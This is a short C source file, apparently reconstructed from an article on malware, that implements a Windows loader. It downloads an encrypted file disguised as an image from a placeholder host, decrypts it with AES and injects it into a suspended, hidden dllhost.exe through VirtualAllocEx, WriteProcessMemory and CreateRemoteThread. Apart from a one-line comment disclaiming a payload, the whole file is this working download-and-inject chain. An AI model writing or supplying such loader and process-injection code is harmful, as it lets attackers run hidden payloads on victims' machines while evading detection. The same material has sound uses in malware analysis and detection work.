#include <windows.h>
#include <wininet.h>
#include <bcrypt.h>
/* Reconstructed API flow from the article; no payload or live endpoint. */
void load_stage(void) {
 DWORD mode, received; unsigned char body[4096], plain[4096], key[32];
 if (!GetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), &mode)) return;
 HINTERNET session = InternetOpenA("Mozilla/5.0", 0, NULL, NULL, 0);
 HINTERNET request = InternetOpenUrlA(session, "https://updates.example.invalid/media.jpg", NULL, 0, INTERNET_FLAG_RELOAD, 0);
 InternetReadFile(request, body, sizeof(body), &received);
 BCRYPT_ALG_HANDLE alg; BCRYPT_KEY_HANDLE aes;
 BCryptOpenAlgorithmProvider(&alg, L"AES", NULL, 0);
 BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
 BCryptGenerateSymmetricKey(alg, &aes, NULL, 0, key, sizeof(key), 0);
 ULONG length;
 BCryptDecrypt(aes, body + 16, received - 16, NULL, body, 16, plain, sizeof(plain), &length, BCRYPT_BLOCK_PADDING);
 STARTUPINFOW si = {sizeof(si)}; PROCESS_INFORMATION pi;
 CreateProcessW(L"C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 void *remote = VirtualAllocEx(pi.hProcess, NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 WriteProcessMemory(pi.hProcess, remote, plain, length, NULL);
 DWORD old;
 VirtualProtectEx(pi.hProcess, remote, length, PAGE_EXECUTE_READ, &old);
 CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}
